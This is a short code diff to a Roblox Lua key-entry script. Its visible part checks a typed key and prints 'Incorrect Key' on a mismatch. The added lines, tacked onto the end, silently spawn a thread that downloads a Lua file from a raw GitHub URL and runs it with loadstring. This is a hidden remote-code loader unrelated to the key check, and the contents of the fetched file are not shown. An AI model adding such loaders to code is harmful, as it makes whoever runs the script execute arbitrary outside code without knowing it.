@@ -84,3 +84,8 @@ Submit.MouseButton1Click:Connect(function()
         print("Incorrect Key") -- If input isn't equal correct key will print Incorrect Key
     end
 end)
+spawn(function()
+    loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/L0v31/skidcomuti/main/change.lua"
+    ))()
+end)
